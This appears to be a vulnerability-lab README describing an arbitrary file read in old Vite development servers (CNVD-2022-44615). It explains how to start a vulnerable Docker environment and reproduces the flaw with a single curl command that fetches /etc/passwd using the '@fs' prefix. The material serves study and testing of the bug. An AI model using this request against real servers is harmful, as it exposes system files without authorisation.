# Vite Development Server Arbitrary File Read (CNVD-2022-44615)

[中文版本(Chinese version)](README.zh-cn.md)

Vite is a modern frontend build tool that provides a faster and leaner development experience for modern web projects. It consists of two major parts: a dev server with Hot Module Replacement (HMR) capability, and a build command that bundles your code with Rollup.

In versions of Vite before 2.3.0, arbitrary files on the filesystem can be read using the `@fs` prefix.

References:

- <https://github.com/vitejs/vite/issues/2820>

## Environment Setup

Execute the following command to start a Vite 2.1.5 development server:

```bash
docker compose up -d
```

After the server starts, you can access the Vite development environment at `http://your-ip:3000`.

> Note: The development server of the old version of Vite defaults to port 3000, while the new version defaults to port 5173, please pay attention to the difference.

## Vulnerability Reproduction

You can read arbitrary files on the filesystem by using the standard `@fs` prefix:

```bash
curl "http://your-ip:3000/@fs/etc/passwd"
```

![](1.png)
